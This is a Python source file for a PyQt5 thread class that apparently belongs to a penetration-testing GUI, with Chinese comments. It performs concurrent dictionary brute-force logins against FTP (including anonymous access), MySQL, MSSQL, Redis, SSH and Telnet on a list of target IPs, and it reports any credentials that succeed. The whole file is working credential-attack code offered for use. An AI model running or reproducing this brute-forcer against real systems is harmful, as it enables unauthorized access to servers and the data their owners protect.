from PyQt5.QtCore import Qt, pyqtSignal, QThread
import ftplib,paramiko,telnetlib,pymssql,pymysql,socket,queue,re
from pymssql import _mssql,_pymssql
import uuid
import decimal
from concurrent.futures import ThreadPoolExecutor,as_completed
from src.getSystemTime import GetTime

class Brute(QThread):
    def __init__(self, concurrency, timeout, ipText, proxy, bruteItem, bruteMode, userDict, passDict):
        super(Brute, self).__init__()
        self.concurrency = concurrency
        self.timeout = timeout
        self.ipText = ipText
        self.proxy = proxy
        self.bruteItem = bruteItem
        self.bruteMode = bruteMode
        self.userDict = userDict
        self.passDict = passDict
        self.ftpFlag = 1
        self.port = []
        self.getPort()
        self.getBruteDict()
        self.brutedList = []
        self.ipList = []

    updateSignal = pyqtSignal(str)
    updateSignal2 = pyqtSignal(int, str)

    def run(self):
        startTime = GetTime.getSystemTime3()
        self.concurrency = 10 if self.concurrency == '' else int(self.concurrency)
        self.timeout = 3000 if self.timeout == '' else int(self.timeout)
        # ip去除换行键 \n ，str -> list，得到单个IP
        ipList = (self.ipText.replace('\n', ',')).split(',')
        # ip去除空字符串
        ipList = list(filter(None, ipList))
        # ip去重
        newIpList = list(set(ipList))
        newIpList.sort(key=ipList.index)
        del ipList
        # self.ipQueue = queue.Queue()
        pattern = re.compile('^(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)$')
        for ip in newIpList:        # 判断ip合法
            if pattern.match(ip):
                self.ipList.append(ip)
                # 将ip列表写进队列
                # self.ipQueue.put(ip)
        try:
            with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
                self.t_list = []
                para = self.getFtpParameter()
                for ip, port, user, pwd in para:
                    if port == 21:
                        t = pool.submit(self.ftpBrute, ip, port, user, pwd)
                        self.t_list.append(t)
                para = self.getMysqlParameter()
                for ip, port, user, pwd in para:
                    if port == 3306:
                        t = pool.submit(self.mysqlBrute, ip, port, user, pwd)
                        self.t_list.append(t)
                para = self.getMssqlParameter()
                for ip, port, user, pwd in para:
                    if port == 1433:
                        t = pool.submit(self.mssqlBrute, ip, port, user, pwd)
                        self.t_list.append(t)
                para = self.getRedisParameter()
                for ip, port, pwd in para:
                    if port == 6379:
                        t = pool.submit(self.redisBrute, ip, port, pwd)
                        self.t_list.append(t)
                para = self.getSshParameter()
                for ip, port, user, pwd in para:
                    if port == 22:
                        t = pool.submit(self.sshBrute, ip, port, user, pwd)
                        self.t_list.append(t)
                para = self.getTelnetParameter()
                for ip, port, user, pwd in para:
                    if port == 23:
                        t = pool.submit(self.telnetBrute, ip, port, user, pwd)
                        self.t_list.append(t)
                # if 23 in self.port: (self.port).remove(23)
                # for future in as_completed(self.t_list):
                #     data = future.result()
                #     print("data:"+data)
                #     if data:
                #         (self.brutedList).append("{}:{}".format(data[0],data[1]))
            endTime = GetTime.getSystemTime3()
            self.updateSignal2.emit(1, "{} 暴力破解完成！用时 {} 秒。".format(GetTime.getSystemTime4(), (endTime - startTime).seconds))
                # for port in self.port:
                #     while not self.ipQueue.empty():
                #         ip = self.ipQueue.get()
                #         if port == 21:
                #             if self.isPortOpen(ip, port):
                #                 with open(self.ftpUserDict, "r", encoding="utf-8") as u:
                #                     for line in u.readlines():
                #                         user = line.strip()
                #                         with open(self.ftpPassDict, "r", encoding="utf-8") as p:
                #                             for line2 in p.readlines():
                #                                 pwd = (line2.strip()).replace("%user%", user)
                #                                 # print(ip,port,user,pwd)
                #                                 t = pool.submit(lambda x: ftpBrute(*x),(ip,port,user,pwd))
                #
                #         if port == 3306:
                #             if self.isPortOpen(ip, port):
                #                 with open(self.mysqlUserDict, "r", encoding="utf-8") as u:
                #                     for line in u.readlines():
                #                         user = line.strip()
                #                         with open(self.mysqlPassDict, "r", encoding="utf-8") as p:
                #                             for line2 in p.readlines():
                #                                 pwd = (line2.strip()).replace("%user%", user)
                #                                 # print(ip, port, user, pwd)
                #                                 t = pool.submit(lambda x: mysqlBrute(*x),(ip,port,user,pwd))
                #         if port == 1433:
                #             if self.isPortOpen(ip, port):
                #                 with open(self.mssqlUserDict, "r", encoding="utf-8") as u:
                #                     for line in u.readlines():
                #                         user = line.strip()
                #                         with open(self.mssqlPassDict, "r", encoding="utf-8") as p:
                #                             for line2 in p.readlines():
                #                                 pwd = (line2.strip()).replace("%user%", user)
                #                                 # print(ip, port, user, pwd)
                #                                 t = pool.submit(lambda x: mssqlBrute(*x),(ip,port,user,pwd))
                #         if port == 6379:
                #             if self.isPortOpen(ip, port):
                #                 with open(self.redisUserDict, "r", encoding="utf-8") as u:
                #                     for line in u.readlines():
                #                         user = line.strip()
                #                         with open(self.redisPassDict, "r", encoding="utf-8") as p:
                #                             for line2 in p.readlines():
                #                                 pwd = (line2.strip()).replace("%user%", user)
                #                                 # print(ip, port, user, pwd)
                #                                 t = pool.submit(lambda x: redisBrute(*x),(ip,port,user,pwd))
                #         if port == 22:
                #             if self.isPortOpen(ip, port):
                #                 with open(self.sshUserDict, "r", encoding="utf-8") as u:
                #                     for line in u.readlines():
                #                         user = line.strip()
                #                         with open(self.sshPassDict, "r", encoding="utf-8") as p:
                #                             for line2 in p.readlines():
                #                                 pwd = (line2.strip()).replace("%user%",user)
                #                                 print(ip, port, user, pwd)
                #                                 t = pool.submit(lambda x: sshBrute(*x),(ip,port,user,pwd))
                #         if port == 23:
                #             if self.isPortOpen(ip, port):
                #                 with open(self.telnetUserDict, "r", encoding="utf-8") as u:
                #                     for line in u.readlines():
                #                         user = line.strip()
                #                         with open(self.telnetPassDict, "r", encoding="utf-8") as p:
                #                             for line2 in p.readlines():
                #                                 pwd = (line2.strip()).replace("%user%", user)
                #                                 # print(ip, port, user, pwd)
                #                                 t = pool.submit(lambda x: telnetBrute(*x),(ip,port,user,pwd))
        except Exception as e:
            print(e)
            # pass

    def ftpBrute(self, ip, port, user, pwd):
        try:
            p = "{}:{}".format(ip, port)
            if self.bruteMode and (p in self.brutedList):
                pass
            else:
                if self.ftpFlag:    # 尝试 匿名模式登录
                    print(222)
                    try:
                        self.ftpFlag = 0
                        ftp = ftplib.FTP()
                        ftp.connect(ip, port)
                        ftp.login()
                        ftp.quit()
                        self.updateSignal.emit("{}::{}::{}::{}::{}".format(ip, port, "ftp", "anonymous", ""))
                        print("{}:{}　ftp匿名连接成功。".format(ip, port, user, pwd))
                        (self.brutedList).append("{}:{}".format(ip, port))
                    except Exception as e:
                        print(e)
                        self.updateSignal2.emit(0, "{}:{}　ftp匿名连接失败。".format(ip, port))
                        # pass
                ftp = ftplib.FTP()
                ftp.connect(ip,port)
                ftp.login(user, pwd)
                ftp.quit()
                self.updateSignal.emit("{}::{}::{}::{}::{}".format(ip,port,"ftp",user,pwd))
                print("{}:{}-{}:{} ftp连接成功。".format(ip,port,user,pwd))
                (self.brutedList).append("{}:{}".format(ip, port))
        except Exception as e:
            print("{}:{}-{}:{} ftp连接失败。".format(ip, port, user, pwd))
            self.updateSignal2.emit(0, "{}:{}-{}:{} ftp连接失败。".format(ip, port, user, pwd))
            # print(e)
            pass

    def mysqlBrute(self, ip, port, user, pwd):
        try:
            p = "{}:{}".format(ip, port)
            if self.bruteMode and (p in self.brutedList):
                pass
            else:
                db = pymysql.connect(host=ip, user=user, password=pwd, port=port)
                db.close()
                self.updateSignal.emit("{}::{}::{}::{}::{}".format(ip, port, "mysql", user, pwd))
                print("{}:{}-{}:{} mysql连接成功。".format(ip, port, user, pwd))
                (self.brutedList).append("{}:{}".format(ip, port))
        except Exception as e:
            print("{}:{}-{}:{} mysql连接失败。".format(ip, port, user, pwd))
            self.updateSignal2.emit(0, "{}:{}-{}:{} mysql连接失败。".format(ip, port, user, pwd))
            # print(e)
            pass

    def mssqlBrute(self, ip, port, user, pwd):
        try:
            p = "{}:{}".format(ip, port)
            if self.bruteMode and (p in self.brutedList):
                pass
            else:
                db = pymssql.connect(host=ip, user=user, password=pwd, port=port)
                db.close()
                self.updateSignal.emit("{}::{}::{}::{}::{}".format(ip, port, "mssql", user, pwd))
                print("{}:{}-{}:{} mssql连接成功。".format(ip, port, user, pwd))
                (self.brutedList).append("{}:{}".format(ip, port))
        except Exception as e:
            print("{}:{}-{}:{} mssql连接失败。".format(ip, port, user, pwd))
            self.updateSignal2.emit(0, "{}:{}-{}:{} mssql连接失败。".format(ip, port, user, pwd))
            # print(e)
            pass

    def redisBrute(self, ip, port, pwd):
        try:
            print("in redis")
            p = "{}:{}".format(ip, port)
            if self.bruteMode and (p in self.brutedList):
                pass
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(b"INFO\r\n")
                result = s.recv(1024)
                if b"redis_version" in result:
                    return "unauthorized"
                elif b"Authentication" in result:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, port))
                    s.send(b"AUTH %s\r\n" % pwd)
                    result = s.recv(1024)
                    if b'+OK' in result:
                        (self.brutedList).append("{}:{}".format(ip, port))
                        return "found passowrd: %s" % pwd
        except Exception as e:
            # pass
            print(e)
        finally:
            s.close()

    def sshBrute(self, ip, port, user, pwd):
        try:
            p = "{}:{}".format(ip,port)
            if self.bruteMode and (p in self.brutedList):
                pass
            else:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port, user, pwd, banner_timeout=200)
                self.updateSignal.emit("{}::{}::{}::{}::{}".format(ip, port, "ssh", user, pwd))
                print("{}:{}-{}:{} ssh连接成功。".format(ip, port, user, pwd))
                self.updateSignal2.emit(0, "{}:{}-{}:{} ssh连接成功。".format(ip, port, user, pwd))
                (self.brutedList).append("{}:{}".format(ip, port))
            # return (ip,port)
        except Exception as e:
            self.updateSignal2.emit(0, "{}:{}-{}:{} ssh连接失败。".format(ip, port, user, pwd))
            print("{}:{}-{}:{} ssh连接失败。".format(ip, port, user, pwd))
            # print(e)
            # pass
        finally:
            ssh.close()

    def telnetBrute(self, ip, port, user, pwd):
        try:
            # print(ip, port, user, pwd)
            p = "{}:{}".format(ip, port)
            if self.bruteMode and (p in self.brutedList):
                pass
            else:
                t = telnetlib.Telnet(ip, timeout=5)
                t.set_debuglevel(0)
                t.read_until(b"login: ")
                t.write(bytes(user, encoding = "utf-8")+b"\n")
                t.read_until(b"assword: ")
                t.write(bytes(pwd, encoding = "utf-8")+b"\n")
                result = t.read_some()
                result = result + t.read_some()
                if result.find(b"Login Fail")>0 or result.find(b"incorrect")>0:
                    print("{}:{}-{}:{} telnet连接失败。".format(ip, port, user, pwd))
                    self.updateSignal2.emit(0, "{}:{}-{}:{} telnet连接失败。".format(ip, port, user, pwd))
                else:
                    self.updateSignal.emit("{}::{}::{}::{}::{}".format(ip, port, "telnet", user, pwd))
                    print("{}:{}-{}:{} telnet连接成功。".format(ip, port, user, pwd))
                    (self.brutedList).append("{}:{}".format(ip, port))
        except Exception as e:
            # pass
            print(e)
        finally:
            t.close()

    def getPort(self):
        # print(self.bruteItem)
        if  "ftp" in self.bruteItem:
            (self.port).append(21)
        if "mysql" in self.bruteItem:
            self.port.append(3306)
        if "mssql" in self.bruteItem:
            self.port.append(1433)
        if "redis" in self.bruteItem:
            self.port.append(6379)
        if "ssh" in self.bruteItem:
            (self.port).append(22)
        if "telnet" in self.bruteItem:
            self.port.append(23)

    def isPortOpen(self, ip, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            return True
        except Exception as e:
            # print(e)
            pass
        finally:
            s.close()

    def getBruteDict(self):
        if "{}" in self.userDict:
            self.ftpUserDict = (self.userDict).format("ftp",'ftp')
            self.mysqlUserDict = (self.userDict).format("mysql", 'mysql')
            self.mssqlUserDict = (self.userDict).format("mssql", 'mssql')
            self.redisUserDict = (self.userDict).format("redis", 'redis')
            self.sshUserDict = (self.userDict).format("ssh", 'ssh')
            self.telnetUserDict = (self.userDict).format("telnet", 'telnet')
        else:
            self.ftpUserDict = self.userDict
            self.mysqlUserDict = self.userDict
            self.mssqlUserDict = self.userDict
            self.redisUserDict = self.userDict
            self.sshUserDict = self.userDict
            self.telnetUserDict = self.userDict

        if "{}" in self.passDict:
            self.ftpPassDict = (self.passDict).format("ftp",'ftp')
            self.mysqlPassDict = (self.passDict).format("mysql", 'mysql')
            self.mssqlPassDict = (self.passDict).format("mssql", 'mssql')
            self.redisPassDict = (self.passDict).format("redis", 'redis')
            self.sshPassDict = (self.passDict).format("ssh", 'ssh')
            self.telnetPassDict = (self.passDict).format("telnet", 'telnet')
        else:
            self.ftpPassDict = self.passDict
            self.mysqlPassDict = self.passDict
            self.mssqlPassDict = self.passDict
            self.redisPassDict = self.passDict
            self.sshPassDict = self.passDict
            self.telnetPassDict = self.passDict

    def getFtpParameter(self):
        try:
            for port in self.port:
                for ip in self.ipList:
                    # print(ip,port)
                    if port == 21:
                        if self.isPortOpen(ip,port):
                            with open(self.ftpUserDict,'r',encoding="utf-8") as u:
                                for line in u.readlines():
                                    user = line.strip()
                                    with open(self.ftpPassDict,'r',encoding="utf-8") as p:
                                        for line2 in p.readlines():
                                            pwd = (line2.strip()).replace("%user%",user)
                                            yield ip, port, user, pwd
                        else:
                            self.updateSignal2.emit(0, "{} 的 {} 端口未开放！".format(ip,port))
        except Exception as e:
            print(e)

    def getMysqlParameter(self):
        try:
            for port in self.port:
                for ip in self.ipList:
                    # print(ip,port)
                    if port == 3306:
                        if self.isPortOpen(ip,port):
                            with open(self.mysqlUserDict,'r',encoding="utf-8") as u:
                                for line in u.readlines():
                                    user = line.strip()
                                    with open(self.mysqlPassDict,'r',encoding="utf-8") as p:
                                        for line2 in p.readlines():
                                            pwd = (line2.strip()).replace("%user%",user)
                                            yield ip, port, user, pwd
                        else:
                            self.updateSignal2.emit(0, "{} 的 {} 端口未开放！".format(ip,port))
        except Exception as e:
            print(e)

    def getMssqlParameter(self):
        try:
            for port in self.port:
                for ip in self.ipList:
                    # print(ip,port)
                    if port == 1433:
                        if self.isPortOpen(ip,port):
                            with open(self.mssqlUserDict,'r',encoding="utf-8") as u:
                                for line in u.readlines():
                                    user = line.strip()
                                    with open(self.mssqlPassDict,'r',encoding="utf-8") as p:
                                        for line2 in p.readlines():
                                            pwd = (line2.strip()).replace("%user%",user)
                                            yield ip, port, user, pwd
                        else:
                            self.updateSignal2.emit(0, "{} 的 {} 端口未开放！".format(ip,port))
        except Exception as e:
            print(e)

    def getRedisParameter(self):
        try:
            for port in self.port:
                for ip in self.ipList:
                    # print(ip,port)
                    if port == 6379:
                        if self.isPortOpen(ip,port):
                            # with open(self.redisUserDict,'r',encoding="utf-8") as u:
                            #     for line in u.readlines():
                            #         user = line.strip()
                            with open(self.redisPassDict,'r',encoding="utf-8") as p:
                                for line2 in p.readlines():
                                    pwd = line2.strip()
                                    # pwd = (line2.strip()).replace("%user%",user)
                                    # print(ip, port, user, pwd)
                                    yield ip, port, pwd
                        else:
                            self.updateSignal2.emit(0, "{} 的 {} 端口未开放！".format(ip,port))
        except Exception as e:
            print(e)

    def getSshParameter(self):
        try:
            for port in self.port:
                for ip in self.ipList:
                    # print(ip,port)
                    if port == 22:
                        if self.isPortOpen(ip,port):
                            with open(self.sshUserDict,'r',encoding="utf-8") as u:
                                for line in u.readlines():
                                    user = line.strip()
                                    with open(self.sshPassDict,'r',encoding="utf-8") as p:
                                        for line2 in p.readlines():
                                            pwd = (line2.strip()).replace("%user%",user)
                                            # print(ip, port, user, pwd)
                                            yield ip, port, user, pwd
                        else:
                            self.updateSignal2.emit(0, "{} 的 {} 端口未开放！".format(ip,port))
        except Exception as e:
            print(e)

    def getTelnetParameter(self):
        try:
            for port in self.port:
                for ip in self.ipList:
                    # print(ip,port)
                    if port == 23:
                        if self.isPortOpen(ip,port):
                            with open(self.telnetUserDict,'r',encoding="utf-8") as u:
                                for line in u.readlines():
                                    user = line.strip()
                                    with open(self.telnetPassDict,'r',encoding="utf-8") as p:
                                        for line2 in p.readlines():
                                            pwd = (line2.strip()).replace("%user%",user)
                                            yield ip, port, user, pwd
                        else:
                            self.updateSignal2.emit(0, "{} 的 {} 端口未开放！".format(ip,port))
        except Exception as e:
            print(e)

    # def getParameter(self):
    #     for port in self.port:
    #         while not self.ipQueue.empty():
    #             ip = self.ipQueue.get()
    #             print(ip,port)
    #             if self.isPortOpen(ip,port):
    #                 if port == 21:
    #                     with open(self.ftpUserDict,'r',encoding="utf-8") as u:
    #                         for line in u.readlines():
    #                             user = line.strip()
    #                             with open(self.ftpPassDict,'r',encoding="utf-8") as p:
    #                                 for line2 in p.readlines():
    #                                     pwd = (line2.strip()).replace("%user%",user)
    #                                     yield ip, port, user, pwd
    #                 elif port == 3306:
    #                     with open(self.mysqlUserDict,'r',encoding="utf-8") as u:
    #                         for line in u.readlines():
    #                             user = line.strip()
    #                             with open(self.mysqlPassDict,'r',encoding="utf-8") as p:
    #                                 for line2 in p.readlines():
    #                                     pwd = (line2.strip()).replace("%user%",user)
    #                                     yield ip, port, user, pwd
    #                 elif port == 1433:
    #                     with open(self.mssqlUserDict,'r',encoding="utf-8") as u:
    #                         for line in u.readlines():
    #                             user = line.strip()
    #                             with open(self.mssqlPassDict,'r',encoding="utf-8") as p:
    #                                 for line2 in p.readlines():
    #                                     pwd = (line2.strip()).replace("%user%",user)
    #                                     yield ip, port, user, pwd
    #                 elif port == 6379:
    #                     with open(self.redisUserDict,'r',encoding="utf-8") as u:
    #                         for line in u.readlines():
    #                             user = line.strip()
    #                             with open(self.redisPassDict,'r',encoding="utf-8") as p:
    #                                 for line2 in p.readlines():
    #                                     pwd = (line2.strip()).replace("%user%",user)
    #                                     yield ip, port, user, pwd
    #                 elif port == 22:
    #                     with open(self.sshUserDict,'r',encoding="utf-8") as u:
    #                         for line in u.readlines():
    #                             user = line.strip()
    #                             with open(self.sshPassDict,'r',encoding="utf-8") as p:
    #                                 for line2 in p.readlines():
    #                                     pwd = (line2.strip()).replace("%user%",user)
    #                                     # print(ip, port, user, pwd)
    #                                     yield ip, port, user, pwd
    #                 elif port == 23:
    #                     with open(self.telnetUserDict,'r',encoding="utf-8") as u:
    #                         for line in u.readlines():
    #                             user = line.strip()
    #                             with open(self.telnetPassDict,'r',encoding="utf-8") as p:
    #                                 for line2 in p.readlines():
    #                                     pwd = (line2.strip()).replace("%user%",user)
    #                                     yield ip, port, user, pwd
    #             else:
    #                 self.updateSignal2.emit(0, "{} 的 {} 端口未开放！".format(ip,port))

    def stop(self):
        self.is__running = False
        self.terminate()
        for t in self.t_list:
            t.cancel()